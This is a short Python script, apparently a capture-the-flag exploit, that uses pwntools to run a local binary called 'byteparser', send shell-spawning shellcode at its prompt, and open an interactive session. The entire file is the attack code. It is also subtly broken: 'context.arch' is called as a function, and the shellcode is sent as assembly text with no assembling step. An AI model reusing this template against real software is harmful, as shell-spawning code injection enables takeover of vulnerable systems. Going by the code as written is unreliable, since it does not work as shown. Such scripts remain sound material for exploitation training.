from pwn import *

p = process("./byteparser")
context.arch('i386')

p.readuntil(b': ')
p.sendline(shellcraft.sh())

p.interactive()